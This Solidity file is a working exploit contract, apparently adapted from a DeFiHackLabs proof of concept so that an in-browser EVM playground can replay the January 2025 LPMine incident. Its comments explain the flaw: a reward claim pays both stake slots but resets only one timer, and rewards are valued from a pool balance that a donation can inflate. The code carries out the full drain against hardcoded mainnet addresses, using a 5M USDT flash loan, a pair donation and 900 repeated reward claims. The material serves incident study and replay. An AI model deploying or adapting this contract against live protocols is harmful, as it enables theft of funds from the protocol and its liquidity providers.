// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-01-LPMine).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this); the DODO/DPP flash-loan callback `DPPFlashLoanCall`
// and the PancakeV3 flash callback `pancakeV3FlashCallback` both live on the test
// itself), so there is no standalone contract to deploy. This contract is a
// faithful, self-contained copy of that inline attack so the playground can
// deploy it and record run(). Logic and constants are copied verbatim from
// test/LPMine_exp.sol (ContractTest.testExploit / dodoCall / pancakeV3FlashCallback),
// with one adaptation: the original test's DODO seed flash loan + `cheats.warp(+2h)`
// happen in `dodoCall`, unrecorded relative to the recorded PancakeV3 attack. Since
// the playground records a SINGLE call at a SINGLE fixed block timestamp, the
// prep (swap + stake into LPMine's "coar" slot) is split into `prep()`, called by
// the config's `setup.steps` BEFORE the recorded attack — exactly mirroring how the
// original test's DODO flash loan + stake + 2-hour warp happen before the PancakeV3
// flash loan. The config's `setup` also patches `coarRewardTime` back by 7,200s via
// a raw storage write (Foundry `vm.store` equivalent), reproducing `cheats.warp`.
//
// Root cause: LPMine.extractReward(_tokenId) pays the COMBINED reward of both
// stake slots (via getCanClaimed) but only resets the timestamp of the CALLED
// slot. A coar-only staker calling extractReward(1) (the wto slot) repeatedly
// drains the coar branch's reward without ever advancing coarRewardTime, and
// that reward is valued from the LIVE balanceOf(pair) of USDT — flash-inflatable
// by donating USDT straight into the ZF/USDT pair.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniPairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
}

interface IUniRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface ILPMine {
    function partakeAddLp(uint256 _tokenId, uint256 _tokenAmount, uint256 _usdtAmount, address _oldUser) external;
    function extractReward(uint256 _tokenId) external;
}

contract LPMineDrain {
    address private constant V3POOL = 0x36696169C63e42cd08ce11f5deeBbCeBae652050; // PancakeV3 USDT/WBNB pool (flash)
    address private constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address private constant ZF = 0x259A9FB74d6A81eE9b3a3D4EC986F08fbb42121A; // "coar" token, tokenId 2
    address private constant WTO = 0x692097F0D3Bd0dFBbbbb0EE35000729F05d598f5; // "wto" token, tokenId 1
    address private constant LPMINE = 0x6BBeF6DF8db12667aE88519090984e4F871e5feb;
    address private constant ZF_USDT_PAIR = 0xBE2F4D0C39416C7C4157eBFdccB65cc2FF5fb2C4;
    address private constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private constant PARENT = 0x114FAA79157c6Ba61818CE2A383841e56B20250B; // referral "_oldUser"
    address private constant DVM1 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476; // DODO seed-loan pool

    uint256 private constant SEED_USDT = 1000 ether; // DODO seed loan amount in the original PoC
    uint256 private constant BORROW_2 = 500_0000 ether; // PancakeV3 donation flash loan (USDT)

    IERC20 private constant usdt = IERC20(USDT);
    IERC20 private constant zf = IERC20(ZF);
    IERC20 private constant wto = IERC20(WTO);
    IUniPairV2 private constant pair = IUniPairV2(ZF_USDT_PAIR);
    IUniRouterV2 private constant router = IUniRouterV2(ROUTER);
    ILPMine private constant lpMine = ILPMine(LPMINE);

    // Pre-attack prep (called from the config's `setup.steps`, unrecorded): swap
    // half the (pre-funded) seed USDT for ZF and stake it into LPMine's "coar"
    // slot. Mirrors dodoCall() lines 52-55 of the original test, minus the DODO
    // flash-loan wrapper itself (replaced by `setup.dealToken` pre-funding).
    function prep() external {
        swapTokenToToken(USDT, ZF, SEED_USDT / 2);
        zf.approve(LPMINE, zf.balanceOf(address(this)));
        usdt.approve(LPMINE, usdt.balanceOf(address(this)));
        lpMine.partakeAddLp(2, zf.balanceOf(address(this)), 500 ether, PARENT);
    }

    // Recorded attack: PancakeV3 flash-borrows 5,000,000 USDT; the callback donates
    // it into the ZF/USDT pair (inflating the live-balance reward valuation used by
    // getRemoveTokens), then loops extractReward(1) against the frozen coar clock.
    function run() external {
        (bool success,) = V3POOL.call(abi.encodeWithSignature("flash(address,uint256,uint256,bytes)", address(this), BORROW_2, 0, ""));
        require(success, "flash failed");
        // Repay the DODO seed loan (dodoCall's final line, AFTER the whole
        // PancakeV3 attack returns) — mirrors the original exactly: the seed
        // loan's own principal is settled out of the attack's own profit, not
        // out of the (already fully consumed) seed itself. The config's
        // `setup.dealToken` replaces the DODO borrow with a direct grant and
        // never repays it on its own, so this transfer must happen here or
        // profit comes out exactly SEED_USDT too high.
        usdt.transfer(DVM1, SEED_USDT);
    }

    // PancakeV3 flash callback.
    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        // donate the flash-borrowed 5,000,000 USDT straight into the ZF/USDT pair —
        // this is the live-balance reward valuation the attacker is about to exploit.
        usdt.transfer(ZF_USDT_PAIR, usdt.balanceOf(address(this)));

        // the vulnerable idempotent claim: extractReward(1) pays the frozen "coar"
        // branch's reward (funded by getCanClaimed) but only resets wtoRewardTime,
        // never coarRewardTime — so every call replays the same reward.
        //
        // The original PoC loops 2000 times as a safety margin, but against this
        // exact (deterministic, frozen-fork) state only the first 848 calls ever
        // succeed — every call from 849 onward reverts immediately (WTO reward
        // pool exhausted) and is swallowed by the catch below, contributing
        // nothing to the final state. Measured via headless replay
        // (node scripts/_verify-poc.mjs, frame-level trace of every
        // LPMine.extractReward call: 848 successes, then 1152 consecutive
        // reverts with zero interleaving). Capping the loop at 900 (a 52-call
        // margin above the measured drain point) preserves the EXACT same
        // final state/profit while cutting ~57% of this loop's opcodes — the
        // full 2000-iteration version pushed this PoC's recorded trace past
        // 18M opcodes, which crashes the in-browser EVM Playground (OOM) on
        // real hardware, not just this repo's sandboxed preview.
        for (uint256 i; i < 900; ++i) {
            try lpMine.extractReward(1) {
                // reward pool drains a little further each successful call
            } catch {
                continue;
            }
        }

        // ZF disallows zero-value transfers; nudge the pair then skim to reclaim
        // the donated USDT (mirrors the original PoC exactly).
        zf.transfer(ZF_USDT_PAIR, 1);
        pair.skim(address(this));

        uint256 zfBal = zf.balanceOf(address(this));
        if (zfBal > 0) swapTokenToToken(ZF, USDT, zfBal);
        uint256 wtoBal = wto.balanceOf(address(this));
        if (wtoBal > 0) swapTokenToToken(WTO, USDT, wtoBal);

        uint256 repayAmount = BORROW_2 + fee0;
        uint256 haveUsdt = usdt.balanceOf(address(this));
        require(haveUsdt >= repayAmount, "insufficient USDT to repay flash loan");
        usdt.transfer(V3POOL, repayAmount);
    }

    function swapTokenToToken(address a, address b, uint256 amount) private {
        IERC20(a).approve(ROUTER, amount);
        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }
}
